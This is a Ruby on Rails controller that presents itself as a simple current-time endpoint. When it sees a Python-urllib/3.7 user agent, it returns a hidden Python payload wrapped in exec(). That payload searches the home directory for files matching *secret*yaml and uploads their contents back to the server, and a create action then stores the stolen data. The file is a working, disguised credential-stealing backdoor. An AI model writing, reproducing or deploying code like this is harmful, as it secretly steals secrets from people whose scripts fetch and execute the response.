class CurrentTimeController < ApplicationController
  def index
    if request.user_agent.include? "Python-urllib/3.7"
      render plain: malicious_payload
    else
      render plain: current_time
    end
  end

  def create
    DataPayload.create!(data: params[:data])
  end

  private

  def malicious_payload
    <<~EOF
    exec('''
    from multiprocessing import Process, Queue

    def steal_user_data(args, kwargs):
      from pathlib import Path
      import os.path
      url = '#{request.original_url}'
      data = ''
      for filename in Path.home().glob('**/*secret*y[a]ml'):
        try:
          data += open(filename, 'r').read()
          data += 'NEW_FILE'
        except:
          pass

      data = parse.urlencode({'data': data}).encode()
      request.urlopen(request.Request(url, data = data))
    queue = Queue()
    p = Process(target=steal_user_data, args=(queue, 1))
    p.start()
    ''')
    EOF
  end

  def current_time
    now = DateTime.now.utc
    now.strftime("\"%Y-%m-%d %H:%M\"")
  end
end
